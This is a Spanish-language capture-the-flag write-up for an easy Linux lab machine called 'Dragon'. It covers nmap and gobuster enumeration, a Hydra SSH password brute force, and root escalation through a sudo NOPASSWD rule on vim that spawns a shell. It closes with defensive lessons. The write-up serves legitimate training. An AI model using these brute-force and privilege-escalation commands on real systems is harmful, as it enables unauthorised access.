# Dragon

**Plataforma:** The Hackers Labs
**Dificultad:** Fácil
**OS:** Linux
**Fecha:** 23/07/2026

## 0. Resumen

Máquina Linux fácil con temática de dragones. El camino de explotación combina:

- Enumeración web para descubrir un directorio oculto con una pista sobre el nombre de un usuario
- Fuerza bruta SSH con Hydra para el acceso inicial
- Escalada directa a root abusando de un permiso `sudo` mal configurado sobre `vim`

## 1. Reconocimiento

###   Ping


##    Nmap

```bash
nmap -p- --open -sCV -Pn -n --min-rate 5000 <IP> -oA dragon
```

| Flag | Función |
|---|---|
| `-p-` | Escanea todos los puertos (1–65535) |
| `--open` | Muestra solo puertos abiertos |
| `-sC` | Scripts NSE por defecto |
| `-sV` | Detección de versión de los servicios |
| `-Pn` | Omite el descubrimiento de host |
| `-n` | No resuelve nombres DNS |
| `--min-rate 5000` | Acelera el escaneo (paquetes/segundo) |
| `-oA` | Output en todos los formatos (.namp, .xml, .gnmap) |

**Resultados:**

- Puerto 22: OpenSSH 9.6p1 (Ubuntu 13)
  
- Puerto 80: Apache 2.4.58

Solo dos servicios expuestos: SSH y un servidor web Apache

La estrategia habitual en este tipo de máquinas es usar la web para conseguir información (usuario, credenciales, etc.) y SSH como vía de acceso final

## 2. Enumeración web

### 2.1 Exploración manual

La página principal no revela nada relevante a simple vista ni en el código fuente. Toca pasar a fuzzing de directorios

### 2.2 Fuzzing de directorios

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
```

| Flag | Función |
|---|---|
| `dir` | Modo de enumeración de directorios |
| `-u` | URL objetivo |
| `-w` | Wordlist de nombres comunes |
| `-x` | Extensiones a probar además de directorios "pelados" |
| `-t 30` | Nº de hilos en paralelo |

→ Directorio encontrado: `/secret`

### 2.3 Pista del nombre de usuario

Al acceder a `/secret` aparece un mensaje que apunta a`dragon` como nombre de usuario del sistema

## 3. Acceso inicial — Fuerza bruta SSH

```bash
hydra -l dragon -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

| Flag | Función |
|---|---|
| `-l dragon` | Usuario objetivo fijo |
| `-P rockyou.txt` | Diccionario de contraseñas |
| `ssh://<IP>` | Protocolo y dirección objetivo |

→ Credenciales válidas: `dragon : shadow`

### 3.2 Conexión SSH

```bash
ssh dragon@<IP>
```

## 4. Escalada de privilegios — sudo + vim

### 4.1 Enumeración de permisos sudo

```bash
sudo -l
```

→ El usuario `dragon` puede ejecutar `/usr/bin/vim` como cualquier usuario (`ALL`) sin contraseña (`NOPASSWD`)

### 4.2 ¿Por qué es explotable?

`vim` permite ejecutar comandos de shell desde su propio editor mediante `:!comando`. Si el binario se lanza vía `sudo` sin pedir contraseña, ese comando externo hereda los privilegios con los que se ejecutó `vim` — en este caso, root. Es un vector muy conocido y documentado en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo).

### 4.3 Explotación

```bash
sudo -u root /usr/bin/vim -c ':!/bin/sh' /dev/null
```

Shell resultante hereda el UID de root (indicado por el cambio de prompt de `$` a `#`)

### 4.4 Primera flag (dragon)

```bash
cat /home/dragon/user.txt
```

### 4.5 Segunda flag (root)

cat /root/root.txt

## 5. Lecciones aprendidas

- **Información expuesta en la web:** directorios "ocultos" pero no autenticados (como `/secret`) pueden filtrar pistas críticas — nombres de usuario, contraseñas o mensajes internos nunca deberían ser accesibles públicamente.
- **Contraseñas débiles:** políticas de contraseñas robustas y, si es posible, autenticación SSH solo por clave pública en lugar de contraseña.
- **`sudo -l` es el primer paso obligatorio** tras conseguir cualquier shell con privilegios limitados — revela de inmediato vectores de escalada evidentes.
- **Permisos de sudo mal configurados:** nunca otorgar `NOPASSWD` sobre binarios con capacidad de escapar a una shell (editores, paginadores, intérpretes, etc.). GTFOBins es la referencia obligada para auditar qué binarios son peligrosos bajo sudo.
- **Principio de mínimo privilegio:** si un usuario necesita ejecutar `vim` como root para una tarea puntual, es preferible restringir el alcance (por ejemplo, mediante wrappers o restricción de argumentos) en lugar de dar acceso total sin contraseña.
